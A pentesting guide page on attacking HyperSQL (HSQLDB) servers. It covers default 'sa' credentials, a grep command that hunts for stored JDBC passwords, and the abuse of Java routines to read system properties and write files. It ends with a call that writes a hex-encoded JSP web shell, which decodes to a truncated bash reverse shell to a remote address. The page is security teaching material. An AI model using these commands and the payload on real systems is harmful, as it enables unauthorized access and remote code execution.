<h1 id="9001-Pentesting-HyperSQL-Server-HSQLDB"><a href="#9001-Pentesting-HyperSQL-Server-HSQLDB" class="headerlink" title="9001 - Pentesting HyperSQL Server (HSQLDB)"></a>9001 - Pentesting HyperSQL Server (HSQLDB)</h1><h2 id="Basic-Information"><a href="#Basic-Information" class="headerlink" title="Basic Information"></a>Basic Information</h2><p>HSQLDB (<a href="http://hsqldb.org/" target="_blank" rel="noopener">HyperSQL DataBase</a>) is the leading SQL relational database system written in Java. It offers a small, fast multithreaded and transactional database engine with in-memory and disk-based tables and supports embedded and server modes.</p>
<p><strong>Default port:</strong> 9001</p>
<pre><code class="text">9001/tcp open  jdbc      HSQLDB JDBC (Network Compatibility Version 2.3.4.0)
</code></pre>
<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><h3 id="Default-Settings"><a href="#Default-Settings" class="headerlink" title="Default Settings"></a>Default Settings</h3><p>Note that by default this service is likely running in memory or is bound to localhost. If you found it, you probably exploited another service and are looking to escalate privileges. </p>
<p>Default credentials are usually <code>sa</code> with a blank password. </p>
<p>If you’ve exploited another service, search for possible credentials using </p>
<pre><code class="bash">grep -rP &#39;jdbc:hsqldb.*password.*&#39; /path/to/search
</code></pre>
<p>Note the database name carefully - you’ll need it to connect.</p>
<h2 id="Info-Gathering"><a href="#Info-Gathering" class="headerlink" title="Info Gathering"></a>Info Gathering</h2><p>Connect to the DB instance by <a href="https://sourceforge.net/projects/hsqldb/files/" target="_blank" rel="noopener">downloading HSQLDB</a> and extracting <code>hsqldb/lib/hsqldb.jar</code>. Run the GUI app (eww) using <code>java -jar hsqldb.jar</code> and connect to the instance using the discovered/weak credentials.</p>
<p>Note the connection URL will look something like this for a remote system: <code>jdbc:hsqldb:hsql://ip/DBNAME</code>.</p>
<h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="Java-Language-Routines"><a href="#Java-Language-Routines" class="headerlink" title="Java Language Routines"></a>Java Language Routines</h3><p>We can call static methods of a Java class from HSQLDB using Java Language Routines. Do note that the called class needs to be in the application’s classpath.</p>
<p>JRTs can be <code>functions</code> or <code>procedures</code>. Functions can be called via SQL statements if the Java method returns one or more SQL-compatible primitive variables. They are invoked using the <code>VALUES</code> statement.</p>
<p>If the Java method we want to call returns void, we need to use a procedure invoked with the <code>CALL</code> statement.</p>
<h3 id="Reading-Java-System-Properties"><a href="#Reading-Java-System-Properties" class="headerlink" title="Reading Java System Properties"></a>Reading Java System Properties</h3><p>Create function:</p>
<pre><code class="sql">CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME &#39;CLASSPATH:java.lang.System.getProperty&#39;
</code></pre>
<p>Execute function:</p>
<pre><code class="sql">VALUES(getsystemproperty(&#39;user.name&#39;))
</code></pre>
<p>You can find a <a href="https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html" target="_blank" rel="noopener">list of system properties here</a>.</p>
<h3 id="Write-Content-to-File"><a href="#Write-Content-to-File" class="headerlink" title="Write Content to File"></a>Write Content to File</h3><p>You can use the <code>com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename</code> Java gadget located in the JDK (auto loaded into the class path of the application) to write hex-encoded items to disk via a custom procedure. <strong>Note the maximum size of 1024 bytes</strong>.</p>
<p>Create procedure:</p>
<pre><code class="sql">CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
&#39;CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#39;
</code></pre>
<p>Execute procedure:</p>
<pre><code class="sql">call writetofile(&#39;/path/ROOT/shell.jsp&#39;, cast (&#39;3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3131392[...]&#39; AS VARBINARY(1024)))
</code></pre>
